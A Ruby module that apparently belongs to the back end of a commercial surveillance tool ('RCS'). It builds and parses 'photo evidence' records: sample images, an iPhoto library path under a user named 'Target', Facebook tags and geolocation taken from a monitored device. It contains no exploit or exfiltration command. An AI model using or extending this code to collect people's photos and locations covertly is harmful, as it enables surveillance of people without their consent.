require 'rcs-common/evidence/common'

module RCS

module PhotoEvidence
  
  PHOTO_VERSION = 2015012601
  
  def content
    path = File.join(File.dirname(__FILE__), 'content', 'screenshot', '00' + (rand(3) + 1).to_s + '.jpg')
    File.open(path, 'rb') {|f| f.read }
  end
  
  def generate_content
    [ content ]
  end
  
  def additional_header
    header = StringIO.new
    header.write [PHOTO_VERSION].pack("I")

    data = {program: "iphoto",
            path: "/Users/Target/Pictures/iPhoto Library/",
            tags: [{name: 'ciccio', handle: '1234567890', type: 'facebook'}, {name: 'pasticcio', handle: '0987654321', type: 'facebook'}],
            description: "my wonderful photo",
            place: {lat: 45.0, lon: 9.1, r: 50},
            device: '',
            target: false
            }

    header.write data.to_json

    header.string
  end
  
  def decode_additional_header(data)
    raise EvidenceDeserializeError.new("incomplete PHOTO") if data.nil? or data.bytesize == 0

    binary = StringIO.new data

    version = binary.read(4).unpack("I").first
    raise EvidenceDeserializeError.new("invalid log version for PHOTO") unless version == PHOTO_VERSION

    ret = Hash.new
    ret[:data] = Hash.new

    data = JSON.parse(binary.read)

    ret[:data][:program] = data['program']
    ret[:data][:path] = data['path']
    ret[:data][:desc] = data['description']
    ret[:data][:device] = data['device']
    ret[:data][:tags] = data['tags'] #.map {|x| x['name']}.join(", ")
    ret[:data][:latitude] = data['place']['lat'] if data['place']
    ret[:data][:longitude] = data['place']['lon'] if data['place']
    ret[:data][:accuracy] = data['place']['r'] if data['place']
    ret[:data][:type] = :target if data['target']

    return ret
  end

  def decode_content(common_info, chunks)
    info = Hash[common_info]
    info[:data] ||= Hash.new
    info[:grid_content] = chunks.join
    yield info if block_given?
    :delete_raw
  end
end

end # ::RCS